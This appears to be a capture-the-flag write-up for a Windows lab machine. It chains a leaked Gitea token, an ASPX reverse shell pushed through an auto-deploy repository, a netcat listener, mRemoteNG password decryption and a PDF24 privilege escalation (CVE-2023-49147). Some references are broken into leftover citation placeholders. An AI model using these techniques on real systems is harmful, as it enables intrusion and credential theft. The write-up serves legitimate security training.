# Lock Writeup

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.1.218
```

Target identified as Windows server running:

- HTTP (Microsoft IIS)
- Port 3000

Nmap revealed:

Microsoft Internet Information Services (IIS)

---

## 2. User Flag

### SMB Enumeration

```bash
smbclient -L 10.129.1.218
```

SMB access was not available.

---

### Web Enumeration

Browsing port 80 revealed nothing interesting.

Browsing port 3000:

```
http://10.129.234.64:3000
```

Discovered:

Gitea instance running.

---

### Access Token Discovery

An access token was found inside the commit logs.

Using repos.py to enumerate repositories:

```bash
python3 repos.py http://10.129.234.64:3000
```

Discovered repository:

```
website
```

Clone the repository using the access token:

```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
```

The README indicated that any committed file would automatically be deployed to the IIS web server.

---

### ASPX Reverse Shell

Since the target was Windows IIS, an ASPX reverse shell was used.

Locate an ASPX shell:

```bash
locate shell | grep aspx
```

Copy shell into the repository:

```bash
cp reverse_shell.aspx .
git add reverse_shell.aspx
git commit -m "shell"
git push
```

Access shell via browser:

```
http://10.129.234.64/reverse_shell.aspx
```

Generate PowerShell reverse shell from:

:contentReference[oaicite:0]{index=0}

Start listener:

```bash
nc -nlvp 1234
```

Reverse shell obtained as:

```
ellen.freeman
```

---

### mRemoteNG Credential Extraction

Search files:

```powershell
tree /f .
```

Found:

```
config.xml
```

The file appeared to be from:

:contentReference[oaicite:1]{index=1}

Extracted credentials:

```
User: Gale.Dekarios
Password (encrypted):
TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
Protocol: RDP
```

Decrypt using public mRemoteNG decrypt script:

```bash
python3 mremoteng_decrypt.py <encrypted_password>
```

Recovered password:

```
ty8wnW9qCKDosXo6
```

---

### RDP Access

Connect via RDP:

```bash
xfreerdp3 /v:10.129.1.218 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
```

User flag obtained.

---

## 3. Root Flag

### PDF24 Version Check

On the target machine:

```powershell
Get-ChildItem "C:\Program Files\PDF24\pdf24.exe" | Format-List VersionInfo
```

Version identified:

```
11.15.1
```

Vulnerable to:

:contentReference[oaicite:2]{index=2}

---

### Exploitation

Upload exploit helper:

```
SetOpLock.exe
```

Follow exploitation steps for CVE-2023-49147.

Privilege escalation successful.

Administrator privileges obtained.

Root flag captured.

---

## What We Learned

### 1. Git Deployment Pipelines Can Be Dangerous

Automatically deploying committed files can allow attackers to upload web shells.

---

### 2. Credential Leakage in Configuration Files

Sensitive tools like mRemoteNG store encrypted credentials that can often be decrypted offline.

---

### 3. Always Patch Third-Party Software

Outdated software such as PDF24 can expose privilege escalation vulnerabilities.

---

### 4. Web + Credential Reuse = Full Compromise

Initial web foothold combined with credential recovery led to full domain compromise.